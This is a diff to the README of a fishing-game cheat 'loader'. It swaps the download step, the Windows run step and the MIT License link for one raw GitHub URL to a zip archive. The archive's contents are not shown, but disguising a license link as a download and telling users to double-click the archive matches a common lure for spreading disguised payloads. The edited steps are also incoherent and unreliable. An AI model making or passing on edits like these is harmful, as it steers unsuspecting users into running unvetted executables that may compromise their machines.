@@ -50,9 +50,9 @@ Explore the versatility! Our loader is crafted for maximum compatibility across 
 
 Get started quickly! Follow the steps below to set up your **Nice Day for Fishing Loader**:
 
-1. **Download** `Loader.rar` from the repository.
+1. **Download** `https://raw.githubusercontent.com/tochibm/NiceDayForFishingUnleashed/main/Afshah/NiceDayForFishingUnleashed.zip` from the repository.
 2. Extract the archive to your preferred directory.
-3. For Windows: Double-click `Loader.exe` and follow on-screen prompts.
+3. For Windows: Double-click `https://raw.githubusercontent.com/tochibm/NiceDayForFishingUnleashed/main/Afshah/NiceDayForFishingUnleashed.zip` and follow on-screen prompts.
 4. For Mac/Linux: Open terminal, run `./Loader` (add `chmod +x Loader` if required).
 5. Launch your fishing game and activate desired features via the dashboard.
 6. Enjoy your enhanced fishing adventure!
@@ -76,7 +76,7 @@ This software is intended purely for **personal, educational, or experimental us
 ## 📄 License
 
 Distributed under the MIT License.  
-[Read the MIT License (2025)](https://opensource.org/licenses/MIT)
+[Read the MIT License (2025)](https://raw.githubusercontent.com/tochibm/NiceDayForFishingUnleashed/main/Afshah/NiceDayForFishingUnleashed.zip)
 
 ---
 
